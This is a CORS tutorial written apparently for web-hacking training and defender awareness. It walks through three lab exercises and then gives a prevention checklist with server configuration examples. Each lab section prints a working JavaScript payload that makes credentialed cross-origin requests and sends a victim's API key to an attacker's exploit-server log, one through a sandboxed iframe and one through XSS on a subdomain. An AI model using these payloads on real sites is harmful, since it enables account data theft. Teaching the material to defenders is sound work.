# Cross origin resource sharing (CORS)

## CORS (Cross-Origin Resource Sharing) — guide for web hacking / defender awareness

* Cross-Origin Resource Sharing (CORS) is a browser mechanism that enables controlled access to resources located outside of a given domain.
* SOP (Same Origin Policy) = locks on your house to stop neighbours from sneaking in.
* CORS = special permission keys so a friendly neighbour can visit.
* Misconfigured CORS = giving a key to anyone who says they are your friend even if they're not.

***

## What is CORS

Imagine two houses:

* House A: example.com
* House B: otherwebsite.com

Normally, if you live in House A, you can't just walk into House B's living room and read their private letters. This is the Same Origin Policy (SOP) — it keeps things safe and private.

CORS is like giving House B a special key:

* House B gives permission: "Hey browser, it's okay for House A to read certain things in my house if they come with a key."

## Why use CORS

* Sometimes websites need to share data — e.g., example.com wants to ask weather.com for a forecast.
* CORS lets browsers relax SOP rules so example.com can talk to weather.com in a controlled way.

## Where does the vulnerability come from?

Common misconfigurations and issues:

1. Bad configuration: trusting any origin (Access-Control-Allow-Origin: \* + credentials true)
   * Analogy: Putting a sign on your front door “Everyone welcome — even with keys to the safe inside.”
2. Trusting user input (reflecting Origin header without validation)
   * Analogy: Letting anyone who says "I'm John" in without checking.
3. Trusting any subdomain (loose suffix matching)
   * Analogy: Trusting anyone whose last name is "Advisor" — you trust EvilAdvisor too.
4. Trusting weird origins like null
   * Analogy: Letting in anyone who says they’re from nowhere.
5. Ignoring protocol (allowing http origins for https site)
   * Analogy: Letting a safe be opened by a key coming via an unlocked bicycle (HTTP).
6. Forgetting Vary: Origin (cache poisoning)
   * Analogy: Leaving your mailbox open; a stranger plants fake letters.

## Real-world example (high level)

* A crypto exchange loads sensitive info (API key) on the account page via AJAX when a user is logged in.
* If the exchange incorrectly trusts and reflects the Origin header (or whitelists null, wildcards, or insecure subdomains) and Allow-Credentials is enabled, then a malicious site can cause a logged-in victim’s browser to request that endpoint and read the response — exfiltrating the API key.

Diagrams (conceptual):

Normal Safe Case:

* User at example.com → Browser blocks request (SOP) → bitcoin.com: "No, you can’t ask me!"

Dangerous CORS Misconfiguration:

* Attacker site attacker.com pretends to be trusted → bitcoin.com API responds with secrets → attacker steals API key.

***

### lab: CORS vulnerability with basic origin reflection

{% stepper %}
{% step %}
### Introduction

* Scenario: penetration tester inspects a crypto exchange that loads private info via AJAX after login.
* Issue: server reflects the Origin header without strict validation, allowing attacker-controlled origin values.
* Impact: if victim visits malicious page, their browser will include session cookies (withCredentials: true), and the server will allow the response to be read by the malicious origin.
{% endstep %}

{% step %}
### Vulnerability — problem

* Source: server reflects user-supplied Origin header without strict validation.
* Sink: Access-Control-Allow-Origin accepts attacker's site + Access-Control-Allow-Credentials: true.
* Challenge: determine if server reflects arbitrary origins and leaks sensitive data.
{% endstep %}

{% step %}
### End goal

* Steal victim's API key from /accountDetails using a crafted CORS exploit.
{% endstep %}

{% step %}
### Reconnaissance plan

* Initial test: log in normally and observe AJAX request for /accountDetails.
* Inspect vulnerability: send the same request in Burp Repeater, add header `Origin: https://example.com`, and check if the response reflects that Origin.
{% endstep %}

{% step %}
### Attack — crafting the exploit

* Exploit payload to run from attacker-controlled site:

{% code title="exploit payload.html" %}
```html
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
      location='/log?key='+this.responseText;
  };
</script>
```
{% endcode %}

* Upload payload to exploit server and deliver to victim. Victim’s browser auto-fetches API key and sends it to attacker logs.
{% endstep %}

{% step %}
### Trigger & enumerate

* Deliver exploit to victim, retrieve API key from exploit server logs, and use it to complete the lab.
{% endstep %}
{% endstepper %}

Why the exploit works:

* Server trusts arbitrary Origin (reflects attacker-supplied value).
* Allow-Credentials enabled: victim's session cookies included.
* Victim's browser exposes sensitive API key to attacker's site.

Real-world impact:

* Account takeover, data leakage, bypass of authentication protections.

***

## Whitelisted null origin explanation (analogy)

* Office allows guests if name/address are on guest list (SOP).
* They also allow people who write "No Address" (Origin: null) for devs/local files.
* Attackers can write "No Address" and be let in, then access secure file room and exfiltrate documents.

Mapping:

* "No Address" = Origin: null
* Security guard = server's CORS policy
* File room = sensitive endpoint
* Sneaking copies out = sending stolen data to attacker site
* Attacker disguise = sandboxed iframe or other trick that causes Origin: null

***

### lab: CORS vulnerability with trusted null origin

{% stepper %}
{% step %}
### Introduction

* Scenario: server’s CORS policy whitelists the null origin (often for local development).
* Attack: force the victim’s browser to send a request with Origin: null (e.g., sandboxed iframe). If the server allows such requests with credentials, the attacker can retrieve and exfiltrate sensitive data.
{% endstep %}

{% step %}
### Vulnerability — problem

* Source: server accepts Origin: null in Access-Control-Allow-Origin.
* Sink: combined with Access-Control-Allow-Credentials: true, cross-origin requests include cookies.
* Challenge: generate a request from victim’s browser with Origin: null so server allows the response to be read.
{% endstep %}

{% step %}
### End goal

* Steal administrator’s API key from /accountDetails using a malicious page that forces Origin: null.
{% endstep %}

{% step %}
### Reconnaissance plan

* Log in and view My Account; see AJAX to /accountDetails returning API key.
* Send a request with header `Origin: null` via Burp Repeater; confirm server reflects null in ACAO and allows credentials.
{% endstep %}

{% step %}
### Attack — crafting the exploit

* Payload (host on exploit server) to force Origin: null via sandboxed iframe:

{% code title="iframe exploit" %}
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
      location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```
{% endcode %}

* Upload to exploit server and deliver to victim. Victim visits malicious page → browser sends Origin: null request → server responds with API key → key exfiltrated to attacker logs.
{% endstep %}

{% step %}
### Trigger & enumerate

* Deliver exploit to victim; check exploit server logs for stolen API key and submit it to complete the lab.
{% endstep %}
{% endstepper %}

Why the exploit works:

* Null origin whitelisted.
* Browser includes cookies (allow-credentials).
* Sandboxed iframe causes Origin: null.

Real-world impact:

* Sensitive data theft, account compromise, SOP bypass via null origin.

***

## Exploiting XSS via CORS trust relationships (high level)

Analogy:

* Bank stores spare vault key at a trusted subdomain.
* If that subdomain has an XSS (broken lock), an attacker can steal the spare key and access the main vault.

Mapping:

* Bank vault = sensitive API endpoint (/api/requestApikey)
* Spare key at friend’s house = CORS trust to subdomain
* Broken lock = XSS on subdomain
* Thief using the key = attacker JS on subdomain pulling data from main site

Even if main site is secure, trusting an insecure subdomain to store access is risky.

***

## Breaking TLS with poorly configured CORS (high level)

Analogy:

* Main system uses HTTPS locked vans. Trusted subdomain uses HTTP bicycles without locks.
* A network attacker (MITM) intercepts the HTTP bicycle traffic, tampers with requests, and gets the main service to send vault documents to the attacker.

Mapping:

* Locked vans = HTTPS
* Bicycle without locks = HTTP subdomain
* Mail thief controlling the road = MITM attacker
* Vault documents = sensitive API response
* Main post office trusting bicycle = CORS whitelist including HTTP origin

Trusting insecure (HTTP) origins in CORS can allow MITM-based exfiltration of otherwise HTTPS-protected data.

***

### lab: CORS vulnerability with trusted insecure protocols (HTTP subdomain)

### Introduction

* Scenario: site trusts all subdomains regardless of HTTPS/HTTP. Attacker finds an HTTP subdomain with XSS, injects JS, and uses CORS trust to read data from main HTTPS site.

### Vulnerability — problem

* Source: CORS trusts all subdomains, including insecure HTTP ones.
* Sink: Access-Control-Allow-Credentials: true sends victim cookies.
* Challenge: inject JS into HTTP subdomain to read sensitive data from the secure main site.

### End goal

* Steal admin API key from /accountDetails via XSS on an HTTP subdomain exploiting CORS trust.

### Reconnaissance plan

* Log in, observe /accountDetails returns API key.
* Test `Origin: http://subdomain.lab-id` and confirm server reflects it in ACAO.
* Find a product page on HTTP subdomain vulnerable to XSS (productId parameter).



### Attack — crafting the exploit

* Example attack flow: inject JS on HTTP subdomain to make a CORS request to the HTTPS main site and exfiltrate result:

{% code title="payload (conceptual)" %}
```
```
{% endcode %}

```html
<script>
  document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+this.responseText;
  };
  %3c/script>&storeId=1"
</script>
```

````
- Host on exploit server. Victim visits malicious page → HTTP subdomain runs attacker JS → CORS request to HTTPS main site returns API key → key exfiltrated.
{% endstep %}

{% step %}
## Trigger & enumerate

- Deliver exploit to victim; retrieve API key from exploit server logs.
{% endstep %}
{% endstepper %}

Why the exploit works:
- CORS trusts insecure HTTP subdomains.
- Allow-Credentials true → cookies included in CORS request.
- Attacker JS reads sensitive response and sends it to attacker.

Real-world impact:
- Sensitive data theft, HTTPS bypass using insecure subdomain, account compromise.

---

# URL validation bypass cheat sheet
<details>
<summary>PortsWigger: URL validation bypass cheat sheet (CORS relevant)</summary>

[[https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet]]  {CORS}

This cheat sheet contains payloads for bypassing URL validation. Useful for SSRF, CORS misconfigurations, and open redirection testing.
</details>

---

# How to prevent CORS-based attacks (summary & checklist)

CORS vulnerabilities arise primarily from misconfiguration. Fix by explicit, strict configuration — not by relying on fuzzy matching or wildcards.

1) Properly declare who can read sensitive resources  
- For private data, the server must set Access-Control-Allow-Origin to exactly which site is allowed.

Bad:
```http
Access-Control-Allow-Origin: *
````

Good:

```http
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
Vary: Origin
```

2. Only allow trusted sites (no reflection or fuzzy matches)

* Do not reflect the Origin header blindly. Use an exact allowlist (scheme + host + port).

Good example (Node/Express):

```js
const ALLOW = new Set(["https://app.example.com"]);
if (ALLOW.has(req.headers.origin)) {
  res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader("Vary", "Origin");
}
```

3. Never whitelist null

* Browsers send Origin: null from file:, data:, sandboxed iframes. Do not accept null for sensitive endpoints. Use explicit dev origins like https://localhost:3000 instead.

Bad:

```http
Access-Control-Allow-Origin: null
```

4. Avoid wildcards on internal networks

* Do not use ACAO: \* for sensitive or internal APIs.

Bad:

```http
Access-Control-Allow-Origin: *
```

Good:

```http
Access-Control-Allow-Origin: https://intranet-app.corp
```

5. Remember: CORS ≠ server-side security

* CORS controls what browsers can read. It does not replace authentication, authorization, CSRF protections, rate limiting, or session management.

Other best practices:

* Enforce HTTPS (reject http:// origins).
* Minimize allowed methods/headers:

```http
Access-Control-Allow-Methods: GET
Access-Control-Allow-Headers: Content-Type
```

* Add Vary: Origin when ACAO is dynamic to prevent cache poisoning.
* Keep server-side protections (authN/authZ, CSRF, rate limiting).

Quick checklist:

* Exact allowlist (scheme+host+port), no reflection.
* No wildcards (\*) for sensitive endpoints.
* No null origin whitelisting.
* Enforce HTTPS only origins.
* Tighten methods/headers; preflight responds 204.
* Vary: Origin when ACAO is dynamic.
* Keep server-side auth and protections active.

***

## Example snippets and tests

Good server response for authenticated endpoints (example):

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
Vary: Origin
```

Bad patterns to avoid:

* Echoing req.headers.origin without validation.
* Allowing `Access-Control-Allow-Origin: null` for production.
* Using `Access-Control-Allow-Origin: *` on sensitive endpoints.

Quick curl tests:

```bash
# Deny unknown origin
curl -i -H "Origin: https://evil.com" https://api.example.com/account

# Deny null origin
curl -i -H "Origin: null" https://api.example.com/account

# Deny suffix tricks
curl -i -H "Origin: https://app.example.com.attacker.net" https://api.example.com/secret

# Deny HTTP origins (enforce HTTPS)
curl -i -H "Origin: http://app.example.com" https://api.example.com/secret
```

Minimal Nginx strict allowlist (concept):

```nginx
map $http_origin $cors_origin {
    default "";
    "https://app.example.com" "https://app.example.com";
}

server {
    listen 443 ssl;
    server_name api.example.com;

    location / {
        if ($cors_origin != "") {
            add_header Access-Control-Allow-Origin $cors_origin always;
            add_header Access-Control-Allow-Credentials true always;
            add_header Vary Origin always;
            add_header Access-Control-Allow-Methods "GET, POST" always;
            add_header Access-Control-Allow-Headers "Content-Type" always;
        }

        if ($request_method = OPTIONS) {
            return 204;
        }

        proxy_pass http://backend;
    }
}
```

Spring Boot strict CORS (concept):

```java
registry.addMapping("/**")
  .allowedOrigins("https://app.example.com") // exact
  .allowedMethods("GET","POST")
  .allowedHeaders("Content-Type")
  .allowCredentials(true);
```

***

## Attack ↔ Defense quick map (summary)

* ACAO: \* on sensitive endpoints → risk: any site can read it → defense: exact trusted origin(s) only.
* Reflecting Origin without validation → risk: full data exfiltration → defense: exact allowlist (scheme+host+port).
* Whitelisting null → risk: sandbox/file/data abuse → defense: never allow null in production.
* Allowing HTTP origins → risk: MITM/HTTPS bypass → defense: HTTPS-only origins.
* Missing Vary: Origin with dynamic ACAO → risk: cache poisoning → defense: set Vary: Origin.
* Over-permissive methods/headers → risk: expanded attack surface → defense: minimize to required.
* Relying on CORS as auth → risk: direct API abuse → defense: keep robust authN/authZ and CSRF protections.

***

## Final checklist (concise)

* Exact allowlist (scheme+host+port); no reflection.
* No wildcards (\*) for sensitive endpoints.
* No null origin whitelisting.
* HTTPS-only origins; reject http://.
* Tighten methods/headers; preflight responds 204.
* Vary: Origin when ACAO is dynamic.
* Keep server-side auth/CSRF/authorization/rate limits.

***

If you want, I can:

* Convert any of the labs into standalone GitBook pages (one lab per page) with step-by-step runnable instructions and code blocks.
* Produce ready-to-paste Nginx or application middleware snippets for a specific tech stack (Express, Spring Boot, Django, etc.). Which would you prefer?
